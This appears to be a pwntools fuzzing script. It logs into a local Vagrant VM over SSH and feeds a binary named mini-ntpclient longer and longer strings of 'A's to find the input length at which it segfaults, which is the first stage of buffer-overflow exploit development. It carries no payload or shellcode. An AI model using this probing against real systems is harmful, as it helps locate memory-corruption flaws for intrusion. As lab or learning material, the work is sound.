from pwn import *
import base64

context.update(arch='i686', os='linux')

# Connect to the server with SSH
ssh_connection = ssh('vagrant', 'default', port=2222)

# Open a shell to write more stuff to
bash = ssh_connection.run('bash')


for i in range(50, 350):
    bash.sendline('/vagrant/mini-ntpclient '+ ("A" * i) )
    received = bash.recvline(timeout=.02)  # output from program
    received += bash.recvline(timeout=.02)  # Segmentation fault if crash else empty
    if 'Segmentation' in str(received):
        # For some reason when sent through pwntools the buffer to crash was 1 length longer than
        # it should have been?
        print('Crash at %d characters' % (i - 1))
        print('Crash at value will be %s' % hex(i - 1))
        break

